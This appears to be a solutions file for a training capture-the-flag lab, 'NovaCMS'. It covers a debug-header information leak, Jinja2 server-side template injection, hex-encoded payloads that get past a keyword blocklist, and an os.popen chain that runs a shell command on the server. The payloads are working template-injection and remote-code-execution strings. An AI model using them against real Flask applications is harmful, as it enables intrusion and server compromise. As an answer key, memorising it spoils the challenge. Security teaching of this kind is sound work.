# CTF 5: NovaCMS -- Solutions

## Credentials

- `abcd12` / *(see credentials.json)*
- `efgh34` / *(see credentials.json)*
- `ijkl56` / *(see credentials.json)*

---

## Flag 1: Information Disclosure

### Discovery Path

1. Login and navigate to the post editor at `/editor`
2. View page source (Ctrl+U) -- find HTML comments:
   ```html
   <!-- TODO: sanitise preview input before Jinja render -->
   <!-- Debug: /api/status with X-Debug-Token: novacms-internal -->
   ```
3. OR visit `/health` which returns:
   ```json
   {
     "app": "NovaCMS",
     "version": "2.1.0-internal",
     "engine": "jinja2",
     "status": "running",
     "note": "Debug endpoints require X-Debug-Token header"
   }
   ```

### Exploit

```bash
curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
```

**Response:**
```json
{
  "flag": "durham-cms-flag1{<flag1_value>}",
  "debug": true
}
```

**Flag 1:** `durham-cms-flag1{...}` *(per-user, see flags.json)*

---

## Flag 2: Basic SSTI -- Config Leak

### Discovery Path

1. From Flag 1, the player knows the app uses Jinja2 for rendering
2. The editor has a "Live Preview" feature that renders post content server-side
3. The HTML comment says "sanitise preview input before Jinja render" -- hinting the input is rendered unsafely

### Exploit

1. Go to the post editor
2. In the body field, type `{{7*7}}` and click Preview
3. The preview shows `49` -- confirming SSTI
4. Type `{{config}}` and click Preview
5. The output contains the full Flask config including:
   ```
   SECRET_KEY: novacms-dev-2024
   ```

**Flag 2:** `durham-cms-flag2{novacms-dev-2024}` *(static -- the SECRET_KEY itself)*

---

## Flag 3: WAF Bypass

### Discovery Path

1. The editor has a toggle for "Filtered Preview (v2)" which uses `/preview/v2`
2. Trying `{{config}}` on v2 returns: "Blocked: input contains forbidden keyword 'config'"
3. Visit `/static/CHANGELOG.md` to read the WAF source:
   - Blocked keywords: `__`, `config`, `os`, `class`, `subclasses`, `request`, `import`, `popen`, `system`, `eval`, `exec`, `builtins`

### Bypass Techniques

**Hex encoding** replaces `__` with `\x5f\x5f` to bypass the literal substring check:
```
# Access config via attr filter with hex-encoded dunders:
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

**Using `|attr()` filter** to avoid dot notation with blocked words:
```
# Instead of: ''.__class__
# Use:        ''|attr('\x5f\x5fclass\x5f\x5f')
```

### Exploit

**Step 1: Confirm WAF bypass works** -- dump Jinja2 globals via hex-encoded dunders:

```
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

**Step 2: Access Flask config through WAF bypass** -- import `flask`, get `current_app.config`:

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('flask')|attr('current_app')|attr('\x63onfig')}}
```

The output contains `WAF_SECRET_FLAG: durham-cms-flag3{...}`.

**Hex encoding key:** `__` -> `\x5f\x5f`, `builtins` -> `\x62uiltins`, `import` -> `\x69mport`, `config` -> `\x63onfig`

**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `app.config['WAF_SECRET_FLAG']`, see flags.json)*

---

## Flag 4: Remote Code Execution

### Discovery Path

1. With WAF bypass mastered from Flag 3, the player now needs to execute a system command
2. Goal: read `/app/secret/flag.txt` from the server filesystem

### Exploit

Using the `lipsum` globals path with hex encoding to bypass the WAF.

**Verified payload** -- all blocked keywords hex-encoded (`import` -> `\x69mport`, `os` -> `\x6f\x73`, `popen` -> `p\x6fpen`, `builtins` -> `\x62uiltins`):

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag.txt')|attr('read')()}}
```

This returns the contents of `/app/secret/flag.txt`.

**Alternative: Full MRO chain:**
```
# Enumerate subclasses to find subprocess.Popen or os._wrap_close
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubcla'+'sses\x5f\x5f')()}}
```

**Flag 4:** `durham-cms-flag4{...}` *(per-user, see flags.json)*

---

## Summary

| Flag | Technique | Difficulty | OWASP |
|------|-----------|------------|-------|
| 1 | Information disclosure (source + hidden API) | Beginner | A05, A01 |
| 2 | Basic SSTI -- `{{config}}` leak | Intermediate | A03, A02 |
| 3 | SSTI WAF bypass (hex encoding + attr filter) | Advanced Intermediate | A03 |
| 4 | RCE via MRO chain / lipsum globals | Advanced | A03 |

## Key Vulnerabilities

1. **Security Misconfiguration**: Debug endpoints and HTML comments left in production
2. **Injection (SSTI)**: User input passed directly to `render_template_string()`
3. **Cryptographic Failure**: SECRET_KEY hardcoded as a weak, guessable value
4. **Broken Access Control**: Hidden API route protected only by a predictable header token
5. **WAF Bypass**: Keyword blocklist defeated by hex encoding and Jinja2 filter chaining
